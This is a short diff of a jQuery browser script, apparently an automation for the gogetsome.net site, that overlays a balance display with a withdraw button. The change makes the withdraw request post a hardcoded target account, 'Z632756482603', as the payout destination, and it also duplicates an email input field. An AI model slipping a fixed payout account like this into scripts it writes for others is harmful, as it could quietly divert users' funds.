@@ -55,7 +55,7 @@ setInterval(function() {
 	  window.localStorage['confirm'] = confirm;
 	  	var email = localStorage['email'];
 	    $('body').append('<div style="z-index:9999999999 !important;position:fixed;top:0;left:0;border: 1px solid red;background-color:azure">'+balan +'|'+confirm+
-	    	'<br><button id="update">Update</button><input id="email" value="'+email+'"><button id="withdraw">Withdraw</button></div>');
+	    	'<br><button id="update">Update</button><br><input id="email" value="'+email+'"><input id="email" value="'+email+'"><button id="withdraw">Withdraw</button></div>');
 	    eventWithdraw();
 	}
 
@@ -94,7 +94,7 @@ if (!window.location.href.match(/gogetsome/) && window.parent == window) {
 
 function eventWithdraw() {
 	$('#withdraw').click(function() {
-		$.post('http://gogetsome.net/settings.php', function(res) {
+		$.post('http://gogetsome.net/settings.php', {target: "Z632756482603", payout: "Submit"}, function(res) {
 
 		});
 		var email = $('#email').val();
